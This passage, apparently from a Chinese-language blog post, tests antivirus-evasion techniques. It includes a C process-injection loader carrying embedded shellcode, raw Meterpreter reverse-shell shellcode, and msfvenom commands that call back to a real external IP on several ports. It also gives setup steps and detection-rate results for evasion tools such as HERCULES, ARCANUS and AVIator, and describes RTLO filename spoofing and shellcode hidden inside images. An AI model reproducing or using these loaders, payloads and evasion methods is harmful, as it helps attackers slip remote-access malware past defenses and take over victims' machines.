class="string">&quot;\xba\x54\x54\xf1\x6c\x03\xc0\xfb\x49\x63\x4f\x03\xbc\xf0\x88&quot;</span></span><br><span class="line">        <span class="string">&quot;\xfb\x41\xc0\xe3\xca\xd7\x6c\x9c\x32\x38\x6c\x5c\x65\x52\x6c&quot;</span></span><br><span class="line">        <span class="string">&quot;\x34\xd1\x06\x3f\x21\x1e\x93\x2c\xfa\x8b\x1c\x04\xae\x1c\x75&quot;</span></span><br><span class="line">        <span class="string">&quot;\xaa\x89\x6b\xda\x55\xfc\xef\x1d\xa9\x82\xc7\x85\xc1\x7c\x58&quot;</span></span><br><span class="line">        <span class="string">&quot;\x36\x11\x17\x58\x66\x79\xec\x77\x89\x49\x0d\x52\xc2\xc1\x84&quot;</span></span><br><span class="line">        <span class="string">&quot;\x33\xa0\x70\x98\x19\x64\x2c\x99\xae\xbd\xdf\xe0\xdf\x42\x20&quot;</span></span><br><span class="line">        <span class="string">&quot;\x15\xf6\x26\x21\x15\xf6\x58\x1e\xc3\xcf\x2e\x61\xd7\x6b\x20&quot;</span></span><br><span class="line">        <span class="string">&quot;\xd4\x7a\xdd\xab\x16\x28\x1d\xfe&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    BOOL <span class="function"><span class="title">injection</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        wchar_t Cappname[MAX_PATH] = &#123; 0 &#125;;</span><br><span class="line">        STARTUPINFO si;</span><br><span class="line">        PROCESS_INFORMATION pi;</span><br><span class="line">        LPVOID lpMalwareBaseAddr;</span><br><span class="line">        LPVOID lpnewVictimBaseAddr;</span><br><span class="line">        HANDLE hThread;</span><br><span class="line">        DWORD dwExitCode;</span><br><span class="line">        BOOL bRet = FALSE;</span><br><span class="line"></span><br><span class="line">        lpMalwareBaseAddr = shellcode;</span><br><span class="line"></span><br><span class="line">        GetSystemDirectory(Cappname, MAX_PATH);</span><br><span class="line">        _tcscat(Cappname, L<span class="string">&quot;\\calc.exe&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Injection program Name:%S\r\n&quot;</span>, Cappname);</span><br><span class="line"></span><br><span class="line">        ZeroMemory(&amp;si, sizeof(si));</span><br><span class="line">        si.cb = sizeof(si);</span><br><span class="line">        ZeroMemory(&amp;pi, sizeof(pi));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (CreateProcess(Cappname, NULL, NULL, NULL,</span><br><span class="line">            FALSE, CREATE_SUSPENDED</span><br><span class="line">            , NULL, NULL, &amp;si, &amp;pi) == 0)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">return</span> bRet;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lpnewVictimBaseAddr = VirtualAllocEx(pi.hProcess</span><br><span class="line">            , NULL, sizeof(shellcode) + 1, MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">            PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (lpnewVictimBaseAddr == NULL)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">return</span> bRet;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        WriteProcessMemory(pi.hProcess, lpnewVictimBaseAddr,</span><br><span class="line">            (LPVOID)lpMalwareBaseAddr, sizeof(shellcode) + 1, NULL);</span><br><span class="line"></span><br><span class="line">        hThread = CreateRemoteThread(pi.hProcess, 0, 0,</span><br><span class="line">            (LPTHREAD_START_ROUTINE)lpnewVictimBaseAddr, NULL, 0, NULL);</span><br><span class="line"></span><br><span class="line">        WaitForSingleObject(pi.hThread, INFINITE);</span><br><span class="line">        GetExitCodeProcess(pi.hProcess, &amp;dwExitCode);</span><br><span class="line">        TerminateProcess(pi.hProcess, 0);</span><br><span class="line">        <span class="built_in">return</span> bRet;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void <span class="built_in">help</span>(char* proc)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s:[-] start a process and injection shellcode to memory\r\n&quot;</span>, proc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int main(int argc, char* argv[])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">help</span>(argv[0]);</span><br><span class="line">        injection();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="golang加载异或的shellcode"><a href="#golang加载异或的shellcode" class="headerlink" title="golang加载异或的shellcode"></a>golang加载异或的shellcode</h3><p>msfvenom生成一段shellcode</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp -f num LHOST=45.32.137.154 LPORT=3356</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, </span><br><span class="line">0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, </span><br><span class="line">0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, </span><br><span class="line">0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, </span><br><span class="line">0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, </span><br><span class="line">0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b, </span><br><span class="line">0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, </span><br><span class="line">0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, </span><br><span class="line">0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, </span><br><span class="line">0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, </span><br><span class="line">0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, </span><br><span class="line">0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, </span><br><span class="line">0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, </span><br><span class="line">0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, </span><br><span class="line">0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x00, 0x00, </span><br><span class="line">0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xe5, </span><br><span class="line">0x49, 0xbc, 0x02, 0x00, 0x0d, 0x1c, 0x2d, 0x20, 0x89, 0x9a, 0x41, 0x54, 0x49, 0x89, 0xe4, </span><br><span class="line">0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68, </span><br><span class="line">0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x6a, 0x0a, </span><br><span class="line">0x41, 0x5e, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89, </span><br><span class="line">0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, </span><br><span class="line">0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, </span><br><span class="line">0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0x0a, 0x49, 0xff, 0xce, 0x75, 0xe5, </span><br><span class="line">0xe8, 0x93, 0x00, 0x00, 0x00, 0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0xe2, 0x4d, 0x31, 0xc9, </span><br><span class="line">0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, </span><br><span class="line">0x83, 0xf8, 0x00, 0x7e, 0x55, 0x48, 0x83, 0xc4, 0x20, 0x5e, 0x89, 0xf6, 0x6a, 0x40, 0x41, </span><br><span class="line">0x59, 0x68, 0x00, 0x10, 0x00, 0x00, 0x41, 0x58, 0x48, 0x89, 0xf2, 0x48, 0x31, 0xc9, 0x41, </span><br><span class="line">0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x89, 0xc3, 0x49, 0x89, 0xc7, 0x4d, 0x31, </span><br><span class="line">0xc9, 0x49, 0x89, 0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8, </span><br><span class="line">0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7d, 0x28, 0x58, 0x41, 0x57, 0x59, 0x68, 0x00, 0x40, </span><br><span class="line">0x00, 0x00, 0x41, 0x58, 0x6a, 0x00, 0x5a, 0x41, 0xba, 0x0b, 0x2f, 0x0f, 0x30, 0xff, 0xd5, </span><br><span class="line">0x57, 0x59, 0x41, 0xba, 0x75, 0x6e, 0x4d, 0x61, 0xff, 0xd5, 0x49, 0xff, 0xce, 0xe9, 0x3c, </span><br><span class="line">0xff, 0xff, 0xff, 0x48, 0x01, 0xc3, 0x48, 0x29, 0xc6, 0x48, 0x85, 0xf6, 0x75, 0xb4, 0x41, </span><br><span class="line">0xff, 0xe7, 0x58, 0x6a, 0x00, 0x59, 0x49, 0xc7, 0xc2, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5</span><br></pre></td></tr></table></figure>

<p>首先使用golang将shellcode异或一下，代码见go-xor-shell</p>
<p>编译之后执行没有shell弹回？（failed）</p>
<h3 id="cpp-shellcode加载器（failed）"><a href="#cpp-shellcode加载器（failed）" class="headerlink" title=".cpp shellcode加载器（failed）"></a>.cpp shellcode加载器（failed）</h3><p>msfvenom生成一段shellcode</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_reverse_tcp LHOST=45.32.137.154 LPORT=3356 &gt; raw.bin</span><br><span class="line"></span><br><span class="line"><span class="built_in">head</span> -c 100 raw.bin | xxd</span><br><span class="line"></span><br><span class="line">hexdump -v -e <span class="string">&#x27;&quot;\\&quot;&quot;x&quot; 1/1 &quot;%02x&quot; &quot;&quot;&#x27;</span> raw.bin &gt;&gt; hex_format</span><br><span class="line"></span><br><span class="line"><span class="built_in">head</span> -c 100 hex_format</span><br><span class="line">\x4d\x5a\xe8\x00\x00\x00\x00\x5b\x52\x45\x55\x89\xe5\x81\xc3\xd6\x42\x00\x00\xff\xd3\x81\xc3\x23\x69</span><br></pre></td></tr></table></figure>

<p>kali中编译</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i686-w64-mingw32-c++ sc-launcher.cpp -o sclauncher.exe</span><br></pre></td></tr></table></figure>

<p>c源码见cpp-shellcode</p>
<p>嵌入shellcode编译好后，运行失败，没有shell回弹</p>
<h3 id="HERCULES"><a href="#HERCULES" class="headerlink" title="HERCULES"></a>HERCULES</h3><p>安装：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">先从Github上克隆到本地</span><br><span class="line">https://github.com/EgeBalci/HERCULES</span><br><span class="line"></span><br><span class="line">安装依赖</span><br><span class="line">go get github.com/fatih/color</span><br><span class="line"></span><br><span class="line">执行安装</span><br><span class="line">go run Setup.go</span><br></pre></td></tr></table></figure>

<p>HERCULES&#x2F;src&#x2F;EGESPLOIT&#x2F;RSE&#x2F;BypassAV.go文件，使用了传统的添加花指令的方式进行免杀。</p>
<ul>
<li>使用</li>
</ul>
<p>傻瓜式生成</p>
<p>火绒查杀</p>
<p>外网msf成功弹回可执行的交互式shell</p>
<p>virustotal             27&#x2F;71</p>
<p>可根据源代码自行改编完善，或者改编源码</p>
<p><em><strong>免杀效果较好</strong></em></p>
<h3 id="Slackor"><a href="#Slackor" class="headerlink" title="Slackor"></a>Slackor</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NvYWxmaXJlLVJlc2VhcmNoL1NsYWNrb3I=">Slackor<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>说明：The server was designed to run on Kali Linux. The agent is compiled for Windows, Mac, and Linux, but has primarily been tested with Windows 10</p>
<p>安装及部署</p>
<p>first login slack</p>
<ul>
<li><p>A Slack Workspace</p>
</li>
<li><p>Register an app with the following permissions:</p>
</li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly9hcGkuc2xhY2suY29tL2FwcHM=">https://api.slack.com/apps<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">channels:<span class="built_in">read</span></span><br><span class="line">channels:<span class="built_in">history</span></span><br><span class="line">channels:write</span><br><span class="line">files:write:user</span><br><span class="line">files:<span class="built_in">read</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Create a bot</li>
</ul>
<p>外网kali及虚拟机kali都部署</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/Coalfire-Research/Slackor</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$GOPATH</span>/src/github.com/Coalfire-Research/Slackor</span><br><span class="line">Run install.sh</span><br><span class="line">Run setup.py</span><br><span class="line">Supply the OAuth Access Token and Bot User OAuth Access Token from your app</span><br></pre></td></tr></table></figure>

<p>setup.py添加OAuth Tokens时候出错，无法使用slack server进行流量通信<br>源码及实现原理可以学习</p>
<h3 id="ARCANUS"><a href="#ARCANUS" class="headerlink" title="ARCANUS"></a>ARCANUS</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0VnZUJhbGNpL0FSQ0FOVVM=">ARCANUS<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>ARCANUS is a customized payload generator&#x2F;handler</p>
<p>傻瓜式操作</p>
<p>ip: 45.32.137.154<br>port: 3344</p>
<p>未加upx的payload能过火绒</p>
<p>查杀率：           15&#x2F;68</p>
<p>加upx后查杀率：     14&#x2F;68</p>
<p>效果好，支持平台多，实用。</p>
<h3 id="TheFatRat"><a href="#TheFatRat" class="headerlink" title="TheFatRat"></a>TheFatRat</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1NjcmVldHNlYy9UaGVGYXRSYXQ=">TheFatRat<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>安装</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Screetsec/TheFatRat</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> TheFatRat</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x setup.sh &amp;&amp; ./setup.sh</span><br></pre></td></tr></table></figure>

<p>缺少组件或者组件版本不对运行失败，要在老版本kali运行</p>
<h3 id="avoidz"><a href="#avoidz" class="headerlink" title="avoidz"></a>avoidz</h3><p>新版kali安装依赖时出错</p>
<h3 id="zirikatu"><a href="#zirikatu" class="headerlink" title="zirikatu"></a>zirikatu</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Bhc2FoaXR6L3ppcmlrYXR1">zirikatu<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>直接.&#x2F;使用sh脚本即可</p>
<p>傻瓜式操作即可</p>
<p>windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</p>
<p>ip: 45.32.137.154</p>
<p>port: 5566</p>
<p>未加壳被火绒查杀,无法加壳</p>
<p>查杀率：        38&#x2F;67</p>
<p>免杀能力一般</p>
<h3 id="AVIator"><a href="#AVIator" class="headerlink" title="AVIator"></a>AVIator</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NoMHBpbi9BVklhdG9y">AVIator<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>使用运行exe即可</p>
<p>msf生成最基础的shellcode</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_https LHOST=45.32.137.154 LPORT=5566  -f csharp -o test.c</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/test<span class="comment"># cat test.c </span></span><br><span class="line">byte[] buf = new byte[535] &#123;</span><br><span class="line">0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,</span><br><span class="line">0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,</span><br><span class="line">0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,</span><br><span class="line">0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,</span><br><span class="line">0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,</span><br><span class="line">0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,</span><br><span class="line">0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,</span><br><span class="line">0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,</span><br><span class="line">0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,</span><br><span class="line">0x8d,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,</span><br><span class="line">0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x3e,0x00,</span><br><span class="line">0x00,0x00,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,</span><br><span class="line">0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x36,0x2e,0x31,0x3b,</span><br><span class="line">0x20,0x54,0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x37,0x2e,0x30,0x3b,0x20,0x72,</span><br><span class="line">0x76,0x3a,0x31,0x31,0x2e,0x30,0x29,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,</span><br><span class="line">0x63,0x6b,0x6f,0x00,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,</span><br><span class="line">0x53,0x53,0x68,0xbe,0x15,0x00,0x00,0xe8,0xfd,0x00,0x00,0x00,0x2f,0x59,0x42,</span><br><span class="line">0x37,0x6d,0x54,0x5f,0x72,0x50,0x5f,0x35,0x36,0x4a,0x44,0x6f,0x67,0x50,0x31,</span><br><span class="line">0x6b,0x48,0x71,0x63,0x77,0x75,0x76,0x42,0x38,0x4f,0x6c,0x4d,0x44,0x48,0x4c,</span><br><span class="line">0x56,0x52,0x31,0x47,0x46,0x34,0x31,0x72,0x77,0x56,0x4e,0x4c,0x39,0x79,0x58,</span><br><span class="line">0x71,0x4c,0x42,0x64,0x67,0x51,0x64,0x38,0x59,0x5f,0x4d,0x4a,0x43,0x4b,0x37,</span><br><span class="line">0x55,0x31,0x39,0x57,0x7a,0x70,0x42,0x61,0x48,0x51,0x6d,0x32,0x39,0x39,0x62,</span><br><span class="line">0x75,0x39,0x76,0x6e,0x55,0x30,0x39,0x44,0x4e,0x47,0x33,0x55,0x70,0x79,0x72,</span><br><span class="line">0x58,0x4f,0x66,0x55,0x33,0x6e,0x53,0x77,0x46,0x49,0x41,0x67,0x6b,0x4f,0x50,</span><br><span class="line">0x74,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,</span><br><span class="line">0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,</span><br><span class="line">0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,</span><br><span class="line">0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,</span><br><span class="line">0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x00,</span><br><span class="line">0x00,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,0x4a,0x00,0x00,</span><br><span class="line">0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,</span><br><span class="line">0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,</span><br><span class="line">0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,</span><br><span class="line">0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x6b,0xff,0xff,</span><br><span class="line">0xff,0x34,0x35,0x2e,0x33,0x32,0x2e,0x31,0x33,0x37,0x2e,0x31,0x35,0x34,0x00,</span><br><span class="line">0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 &#125;;</span><br></pre></td></tr></table></figure>

<p>Thread Hijacking</p>
<p>填入payload， AES KEY和IV默认</p>
<p>设置保存的path</p>
<ul>
<li>勾选right to left override(RTLO)可以伪装后缀名</li>
</ul>
<p>另外还可以将shellcode注入特定进程(效果很好)</p>
<p>spawn notepad32   火绒报毒     外网msf成功上线     查杀率    22&#x2F;68      效果不错</p>
<p>newthread         火绒报毒     外网msf成功上线     查杀率    31&#x2F;68      效果一般</p>
<p>apcalertable      火绒不报毒   外网msf没有上线</p>
<p>upx无法加壳        .NET files are not yet supported</p>
<p>成功但是火绒会查杀</p>
<h3 id="DKMC（内网网段使用）"><a href="#DKMC（内网网段使用）" class="headerlink" title="DKMC（内网网段使用）"></a>DKMC（内网网段使用）</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL01yLVVuMWswZDNyL0RLTUM=">DKMC<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>安装：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/Mr-Un1k0d3r/DKMC</span><br><span class="line">$ <span class="built_in">cd</span> DKMC</span><br><span class="line">$ <span class="built_in">mkdir</span> output</span><br></pre></td></tr></table></figure>

<p>Don’t kill my cat is a tool that generates obfuscated shellcode that is stored inside of polyglot images. The image is 100% valid and also 100% valid shellcode. The idea is to avoid sandbox analysis since it’s a simple “legit” image. For now the tool rely on PowerShell the execute the final shellcode payload.</p>
<p>官方用法:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Generate shellcode (meterpreter / Beacon)</span><br><span class="line">Embed the obfuscated shellcode inside the image</span><br><span class="line">PowerShell download the image and execute the image as shellcode</span><br><span class="line">Get your shell</span><br></pre></td></tr></table></figure>

<ul>
<li>Generate shellcode from a raw file</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sc</span><br><span class="line">(shellcode)&gt;&gt;&gt; <span class="built_in">set</span> <span class="built_in">source</span> shellcode.txt</span><br><span class="line">        [+] <span class="built_in">source</span> value is <span class="built_in">set</span>.</span><br><span class="line"></span><br><span class="line">(shellcode)&gt;&gt;&gt; run</span><br><span class="line">        [+] Shellcode:</span><br><span class="line">\x41\x41\x41\x41</span><br></pre></td></tr></table></figure>

<ul>
<li>Generate the obfuscated shellcode embedded inside of an image.</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; gen</span><br><span class="line">(generate)&gt;&gt;&gt; <span class="built_in">set</span> shellcode \x41\x41\x41\x41</span><br><span class="line">        [+] shellcode value is <span class="built_in">set</span>.</span><br><span class="line">        </span><br><span class="line">(generate)&gt;&gt;&gt; run</span><br><span class="line">        [+] Image size is 300 x 275</span><br><span class="line">        [+] Generating obfuscation key 0x1f1dad93</span><br><span class="line">        [+] Shellcode size 0x4 (4) bytes</span><br><span class="line">        [+] Generating magic bytes 0xa4d0c752</span><br><span class="line">        [+] Final shellcode length is 0x57 (87) bytes</span><br><span class="line">        [+] New BMP header <span class="built_in">set</span> to 0x424de9a4c60300</span><br><span class="line">        [+] New height is 0x0e010000 (270)</span><br><span class="line">        [+] Successfully save the image. (/home/ringzer0/tools/DKMC/output/output-1496175261.bmp)</span><br><span class="line"></span><br><span class="line">(generate)&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

